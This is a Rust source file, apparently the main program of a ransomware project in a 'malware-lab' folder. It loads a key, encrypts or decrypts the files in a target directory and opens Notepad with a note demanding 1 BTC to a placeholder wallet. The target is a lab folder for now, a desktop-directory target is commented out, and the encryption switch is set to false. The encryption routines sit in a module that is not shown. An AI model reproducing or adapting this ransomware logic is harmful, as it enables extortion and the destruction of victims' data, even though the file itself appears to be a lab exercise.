// #![windows_subsystem = "windows"]

use std::path::Path;

use utils::{
    app_open::open_notepad_with_msg,
    crypter::{crypter_files, fetch_key},
    MalwareResult,
};

#[tokio::main]
async fn main() -> MalwareResult<()> {
    // GEN KEY
    // let key = fetch_key(Some(key_path), Some("1234567890"))?;
    // READ KEY
    let key_path = Path::new(r"X:\dev\projects\malware-lab\assets\key_decrypt.key");
    let key = fetch_key(Some(key_path), None)?;

    let target_dir_binding = dirs::desktop_dir().unwrap();
    // let target_dir = target_dir_binding.to_str().unwrap();
    let target_dir = "X:\\dev\\projects\\malware-lab\\assets\\target_encrypt";

    let encrypt_files = false;

    let mut msg = if encrypt_files {
        vec![
        "Sorry your files are encrypted, to decrypt them you need to pay 1 BTC to the address: FAKE_ADDRESS_WALLET\n",
        "The following files have been encrypted:\n",
        ]
    } else {
        vec![
            "Thanks, your files are decrypted\n",
            "The following files have been decrypted:\n",
        ]
    };

    let files = crypter_files(key, Some(Path::new(&target_dir)), encrypt_files)?;
    let files_used: Vec<&str> = files.iter().map(|str| str.as_str()).collect();

    msg.extend(files_used);

    open_notepad_with_msg(msg);
    Ok(())
}
